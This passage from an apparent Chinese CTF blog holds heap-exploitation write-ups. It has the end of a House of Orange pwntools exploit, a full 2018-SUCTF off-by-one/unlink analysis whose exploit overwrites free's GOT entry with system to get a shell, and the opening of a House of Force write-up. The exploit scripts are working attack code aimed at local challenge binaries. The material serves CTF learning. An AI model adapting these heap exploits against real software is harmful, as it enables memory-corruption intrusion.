VERBOSE:</span><br><span class="line">	context(log_level = <span class="string">&apos;debug&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdb</span><span class="params">(a=<span class="string">&apos;&apos;</span>)</span>:</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">  <span class="keyword">if</span> a != <span class="string">&apos;&apos;</span></span><br><span class="line">		raw_input(a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(length,name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice : &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Length of name :&apos;</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Name :&apos;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Price of Orange:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Color of Orange:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Finish&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice :&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(length,name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice :&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Length of name :&apos;</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Name:&apos;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Price of Orange: &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Color of Orange: &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Finish&apos;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment">#step1. alter the top chunk&apos;s size</span></span><br><span class="line">	build(<span class="number">0x10</span>,<span class="string">&apos;aaaa&apos;</span>)</span><br><span class="line">	payload = <span class="string">&apos;a&apos;</span>*<span class="number">0x18</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xfa1</span>)</span><br><span class="line">	upgrade(<span class="number">0x100</span>,payload)</span><br><span class="line">	build(<span class="number">0x1000</span>,<span class="string">&apos;cccccccc&apos;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#step2. leak the address</span></span><br><span class="line">	build(<span class="number">0x400</span>,<span class="string">&apos;aaaaaaaa&apos;</span>)	<span class="comment">#chunk*</span></span><br><span class="line">	see()</span><br><span class="line">	p.recvuntil(<span class="string">&apos;a&apos;</span>*<span class="number">8</span>)</span><br><span class="line">	addr = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))</span><br><span class="line">	libc_base = addr <span class="number">-0x3C4B20</span><span class="number">-1640</span></span><br><span class="line">	log.success(<span class="string">&apos;libc_base:&apos;</span>+hex(libc_base))</span><br><span class="line">	system_addr = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;system_addr: &apos;</span>+hex(system_addr))</span><br><span class="line">	upgrade(<span class="number">0x400</span>,<span class="string">&apos;a&apos;</span>*<span class="number">16</span>)</span><br><span class="line">	see()</span><br><span class="line">	p.recvuntil(<span class="string">&apos;a&apos;</span>*<span class="number">16</span>)</span><br><span class="line">	heap_base = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))<span class="number">-0xc0</span></span><br><span class="line">	log.success(<span class="string">&apos;chunk_addr: &apos;</span>+hex(heap_base))</span><br><span class="line"></span><br><span class="line">	IO_list_all_addr = libc_base+libc.symbols[<span class="string">&apos;_IO_list_all&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;IO_list_all_addr: &apos;</span>+hex(IO_list_all_addr))</span><br><span class="line">	payload = <span class="string">&apos;a&apos;</span>*<span class="number">0x400</span></span><br><span class="line">	payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>)+p64(<span class="number">0</span>)	</span><br><span class="line"></span><br><span class="line">  <span class="comment">#step3. forge data</span></span><br><span class="line">	fake_file = <span class="string">&apos;/bin/sh\x00&apos;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>) + p64(IO_list_all_addr<span class="number">-0x10</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">	fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&apos;\x00&apos;</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>) <span class="comment">#mode&lt;=0</span></span><br><span class="line">	fake_file += p64(<span class="number">0</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)</span><br><span class="line">	fake_file += p64(heap_base+<span class="number">0x5d0</span>)<span class="comment">#pointer to vtable</span></span><br><span class="line">	payload += fake_file</span><br><span class="line">	payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">	payload += p64(system_addr)<span class="comment">#_IO_OVERFLOW</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#step4. attack</span></span><br><span class="line">	upgrade(<span class="number">0x800</span>,payload)	</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice : &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
<h2 id="0x07-REFFERENCE"><a href="#0x07-REFFERENCE" class="headerlink" title="0x07 REFFERENCE"></a>0x07 REFFERENCE</h2><p>[&#x7406;&#x89E3; glibc malloc&#xFF1A;malloc() &#x4E0E; free() &#x539F;&#x7406;&#x56FE;&#x89E3;]<a href="https://blog.csdn.net/maokelong95/article/details/52006379" target="_blank" rel="noopener">https://blog.csdn.net/maokelong95/article/details/52006379</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/03/24/2018-SUCTF-Heap-[off by one,unlink]/">2018-SUCTF-Heap-[off by one,unlink]</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-24</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/unlink/">unlink</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/off-by-one/">off by one</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/x64/">x64</a></span><div class="content"><h3 id="0x00-off-by-one"><a href="#0x00-off-by-one" class="headerlink" title="0x00 off by one"></a>0x00 off by one</h3><p>off by one &#x662F;&#x6307;&#x4E00;&#x79CD;&#x5355;&#x5B57;&#x8282;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#xFF0C;&#x5373;&#x7A0B;&#x5E8F;&#x5411;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x5199;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5199;&#x5165;&#x7684;&#x5B57;&#x8282;&#x6570;&#x8D85;&#x8FC7;&#x4E86;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5E76;&#x4E14;&#x53EA;&#x6EA2;&#x51FA;&#x4E86;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x8FD9;&#x79CD;&#x6F0F;&#x6D1E;&#x4E00;&#x822C;&#x4E0E;&#x8FB9;&#x754C;&#x9A8C;&#x8BC1;&#x4E0D;&#x4E25;&#x8C28;&#x548C;&#x5B57;&#x7B26;&#x4E32;&#x64CD;&#x4F5C;&#x4E0D;&#x4E25;&#x8C28;&#x6709;&#x5173;&#x3002;&#x5176;&#x4E2D;&#x5B57;&#x7B26;&#x4E32;&#x64CD;&#x4F5C;&#x4E0D;&#x4E25;&#x8C28;&#x5305;&#x62EC;</p>
<ol>
<li>&#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x8BED;&#x53E5;&#x5411;&#x5806;&#x5199;&#x5165;&#x6570;&#x636E;&#x65F6;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#x3002;&#x6BD4;&#x5982;&#x5FAA;&#x73AF;&#x6B21;&#x6570;&#x8BBE;&#x7F6E;&#x9519;&#x8BEF;&#xFF0C;&#x6216;&#x8005;&#x5411;&#x6709;&#x6548;&#x6570;&#x636E;&#x533A;&#x5916;&#x591A;&#x5199;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x6570;&#x636E;</li>
<li>&#x5B57;&#x7B26;&#x4E32;&#x64CD;&#x4F5C;&#x4E0D;&#x5F53;&#xFF0C;&#x6BD4;&#x5982;strcpy&#x51FD;&#x6570;<br>&#x9488;&#x5BF9;&#x7B2C;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x6BD4;&#x5982;2016-BCTF-bcloud&#x8FD9;&#x9898;&#xFF0C;&#x7A0B;&#x5E8F;&#x81EA;&#x5DF1;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x7528;for&#x5B9E;&#x73B0;&#x7684;&#x5199;&#x5165;&#x51FD;&#x6570;&#xFF1A;<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_804868D</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">  }</span><br><span class="line">  *(_BYTE *)(i + a1) = <span class="number">0</span>;   <span class="comment">//* off by one</span></span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>&#x4F46;&#x662F;&#x5728;&#x5FAA;&#x73AF;&#x5916;&#x591A;&#x8D4B;&#x503C;&#x4E86;&#x4E00;&#x6B21;&#xFF0C;&#x5728;&#x672C;&#x8BE5;&#x5199;&#x5165;&#x6570;&#x636E;&#x7684;&#x6570;&#x636E;&#x533A;&#x5916;&#x591A;&#x8D4B;&#x503C;&#x4E86;&#x4E00;&#x4E2A;\x00&#xFF0C;&#x8FD9;&#x4E2A;\x00&#x662F;&#x4E3A;&#x4E86;&#x52A0;&#x5165;&#x5B57;&#x7B26;&#x4E32;&#x622A;&#x65AD;&#x7B26;&#xFF0C;&#x4F46;&#x662F;&#x5E94;&#x8BE5;&#x4E5F;&#x8981;&#x4E3A;&#x8FD9;&#x4E2A;&#x622A;&#x65AD;&#x7B26;&#x591A;&#x7533;&#x8BF7;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x9020;&#x6210;&#x4E86;&#x5728;&#x6709;&#x6548;&#x6570;&#x636E;&#x533A;&#x5916;&#x5199;&#x5165;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x591A;&#x5199;&#x7684;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x6570;&#x636E;&#x521A;&#x597D;&#x88AB;&#x662F;&#x5806;&#x6307;&#x9488;&#x8986;&#x76D6;&#xFF0C;&#x9020;&#x6210;&#x53EF;&#x4EE5;&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;&#xFF0C;&#x4FEE;&#x6539;topchunk&#x7684;SIZE&#x3002;</p>
<p>&#x8FD9;&#x4E2A;&#x9898;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x64CD;&#x4F5C;&#x4E0D;&#x5F53;&#x9020;&#x6210;&#x7684;off by one</p>
<h3 id="0x01-&#x7A0B;&#x5E8F;&#x5206;&#x6790;"><a href="#0x01-&#x7A0B;&#x5E8F;&#x5206;&#x6790;" class="headerlink" title="0x01 &#x7A0B;&#x5E8F;&#x5206;&#x6790;"></a>0x01 &#x7A0B;&#x5E8F;&#x5206;&#x6790;</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Canary</span>                        <span class="string">:</span> <span class="literal">No</span></span><br><span class="line"><span class="string">NX</span>                            <span class="string">:</span> <span class="literal">Yes</span></span><br><span class="line"><span class="string">PIE</span>                           <span class="string">:</span> <span class="literal">No</span></span><br><span class="line"><span class="string">Fortify</span>                       <span class="string">:</span> <span class="literal">No</span></span><br><span class="line"><span class="string">RelRO</span>                         <span class="string">:</span> <span class="string">Partial</span></span><br></pre></td></tr></table></figure>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./heap</span><br><span class="line"><span class="number">1</span><span class="symbol">:creat</span></span><br><span class="line"><span class="number">2</span><span class="symbol">:delet</span></span><br><span class="line"><span class="number">3</span><span class="symbol">:show</span></span><br><span class="line"><span class="number">4</span><span class="symbol">:edit</span></span><br></pre></td></tr></table></figure>
<p>&#x7A0B;&#x5E8F;&#x5411;&#x5806;&#x4E2D;&#x5199;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x6CA1;&#x6709;&#x52A0;&#x5165;&#x5B57;&#x7B26;&#x4E32;&#x622A;&#x65AD;&#x7B26;\x00&#xFF0C;&#x5BFC;&#x81F4;&#x4F7F;&#x7528;strcpy&#x51FD;&#x6570;&#x65F6;&#xFF0C;&#x4ECE;&#x7F13;&#x51B2;&#x533A;&#x62F7;&#x8D1D;&#x4E86;&#x591A;&#x4F59;&#x9884;&#x671F;&#x7684;&#x6570;&#x636E;&#x5230;&#x5806;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x5BFC;&#x81F4;&#x5F53;&#x524D;&#x5806;&#x6570;&#x636E;&#x957F;&#x5EA6;&#x4E3A;&#x672C;&#x8EAB;&#x5806;&#x6570;&#x636E;&#x957F;&#x5EA6;&#x52A0;&#x4E0A;&#x4E0B;&#x4E00;&#x4E2A;&#x5806;&#x7684;prev_size+SIZE&#x7684;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x3002;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s_data = <span class="built_in">malloc</span>(nbytes);</span><br><span class="line">s = <span class="built_in">malloc</span>(nbytes);</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, nbytes);</span><br><span class="line"><span class="built_in">memset</span>(s_data, <span class="number">0</span>, nbytes);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input your data&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, s_data, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="keyword">char</span> *)s, (<span class="keyword">const</span> <span class="keyword">char</span> *)s_data);</span><br></pre></td></tr></table></figure></p>
<p>&#x800C;&#x7A0B;&#x5E8F;&#x7684;edit&#x51FD;&#x6570;&#x662F;&#x6839;&#x636E;&#x5806;&#x957F;&#x5EA6;&#x4FEE;&#x6539;&#x5806;&#x6570;&#x636E;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;nextchunk&#x7684;SIZE&#x7684;p&#x6807;&#x5FD7;&#x4F4D;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x89E6;&#x53D1;freechunk&#x7684;&#x5408;&#x5E76;&#xFF0C;&#x9002;&#x5F53;&#x6784;&#x9020;chunk&#x5185;&#x5BB9;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;unlink&#x83B7;&#x5F97;&#x53EF;&#x63A7;&#x6307;&#x9488;&#xFF0C;&#x8FDB;&#x800C;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x7684;&#x8BFB;&#x5199;&#x3002;</p>
<h3 id="0x02-EXP"><a href="#0x02-EXP" class="headerlink" title="0x02 EXP"></a>0x02 EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&apos;./heap&apos;</span>)</span><br><span class="line">elf = ELF(<span class="string">&apos;./heap&apos;</span>)</span><br><span class="line">libc = ELF(<span class="string">&apos;./libc&apos;</span>)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">VERBOSE = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">	context(log_level = <span class="string">&apos;debug&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat</span><span class="params">(lenth,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;4:edit&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;len&apos;</span>)</span><br><span class="line">	p.sendline(str(lenth))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;data&apos;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;4:edit&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;id&apos;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;4:edit&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;id&apos;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;4:edit&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;4&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;id&apos;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;data&apos;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	heap_form3 = <span class="number">0x6020d8</span></span><br><span class="line">	creat(<span class="number">0x80</span>,<span class="string">&apos;bbbbbbbb&apos;</span>)	<span class="comment">#0  0x6020c0</span></span><br><span class="line">	creat(<span class="number">0x80</span>,<span class="string">&apos;/bin/sh;&apos;</span>)	<span class="comment">#1	0x6020c8</span></span><br><span class="line">	creat(<span class="number">0x80</span>,<span class="string">&apos;bbbbbbbb&apos;</span>)	<span class="comment">#2	0x6020d0</span></span><br><span class="line">	creat(<span class="number">0x88</span>,<span class="string">&apos;a&apos;</span>*<span class="number">0x98</span>)	  <span class="comment">#3	0x6020d8</span></span><br><span class="line">	creat(<span class="number">0x80</span>,<span class="string">&apos;bbbbbbbb&apos;</span>)	<span class="comment">#4	0x6020e0</span></span><br><span class="line">	payload = p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(heap_form3<span class="number">-0x18</span>)+p64(heap_form3<span class="number">-0x10</span>)</span><br><span class="line">	payload = payload.ljust(<span class="number">0x80</span>,<span class="string">&apos;a&apos;</span>)</span><br><span class="line">	payload += p64(<span class="number">0x80</span>)</span><br><span class="line">	payload += <span class="string">&apos;\x90&apos;</span></span><br><span class="line">	edit(<span class="number">3</span>,payload)</span><br><span class="line">	delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">	payload = p64(elf.got[<span class="string">&apos;free&apos;</span>])</span><br><span class="line">	edit(<span class="number">3</span>,payload)</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	free_addr = p.recvuntil(<span class="string">&apos;1:creat&apos;</span>)[<span class="number">1</span>:<span class="number">-7</span>].ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>)</span><br><span class="line">	free_addr = u64(free_addr)</span><br><span class="line">	libc_base = free_addr - libc.symbols[<span class="string">&apos;free&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;libc_base: &apos;</span>+hex(libc_base))</span><br><span class="line">	system_addr = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;system_addr: &apos;</span>+hex(system_addr))</span><br><span class="line">	edit(<span class="number">0</span>,p64(system_addr))</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/03/20/2016-BCTF-bcloud-[Heap of Force]/">2016-BCTF-bcloud-[Heap of Force]</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-20</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/House-of-Force/">House of Force</a></span><div class="content"><h3 id="0x00-House-of-Force"><a href="#0x00-House-of-Force" class="headerlink" title="0x00 House of Force"></a>0x00 House of Force</h3><p>House Of Force &#x662F;&#x4E00;&#x79CD;&#x5806;&#x5229;&#x7528;&#x65B9;&#x6CD5;,&#x901A;&#x8FC7;&#x6EA2;&#x51FA;&#x7684;&#x65B9;&#x5F0F;&#x5C06;topchunk&#x7684;size&#x4FEE;&#x6539;&#x6210;&#x8DB3;&#x591F;&#x5927;&#xFF0C;&#x5728;&#x901A;&#x8FC7;&#x7533;&#x8BF7;&#x4E00;&#x5B9A;&#x5927;&#x5C0F;&#x7684;chunk&#xFF0C;&#x5C06;topchunk&#x7684;&#x5730;&#x5740;&#x53D8;&#x6210;&#x6211;&#x4EEC;&#x6307;&#x5B9A;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6BD4;&#x5982;&#x67D0;&#x4E9B;&#x51FD;&#x6570;&#x7684;got&#x5730;&#x5740;&#xFF0C;&#x6B64;&#x65F6;&#x518D;&#x7533;&#x8BF7;&#x4E00;&#x4E2A;chunk&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x5BF9;&#x8BE5;got&#x6307;&#x9488;&#x7684;&#x5185;&#x5BB9;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#x548C;&#x5229;&#x7528;&#x3002;</p>
<p>&#x5F53;&#x7528;&#x6237;&#x7533;&#x8BF7;chunk&#x65F6;&#xFF0C;&#x6240;&#x6709;&#x7A7A;&#x95F2;&#x5757;&#x5747;&#x4E0D;&#x80FD;&#x6EE1;&#x8DB3;&#x5176;&#x5927;&#x5C0F;&#x65F6;&#xFF0C;glibc&#x5C31;&#x4F1A;&#x4ECE;topchunk&#x4E2D;&#x5206;&#x5272;&#x51FA;&#x76F8;&#x5E94;&#x5927;&#x5C0F;&#x7684;chunk&#x3002;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7A7A;&#x95F2;&#x5757;&#x6EE1;&#x8DB3;&#x4E0D;&#x4E86;&#x7684;chunk&#x90FD;&#x4F1A;&#x4ECE;topchunk&#x4E2D;&#x5206;&#x5272;&#xFF0C;glibc&#x5BF9;&#x6B64;&#x6709;&#x4E00;&#x4E9B;&#x5224;&#x65AD;&#x3002;<br>&#x5728;glibc&#x6E90;&#x7801;<code>_int_malloc</code>&#x51FD;&#x6570;&#x4E2D;&#xFF1A;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&#x83B7;&#x53D6;topchunk&#x6307;&#x9488;&#xFF0C;&#x83B7;&#x53D6;topchunk&#x7684;&#x5927;&#x5C0F;</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span 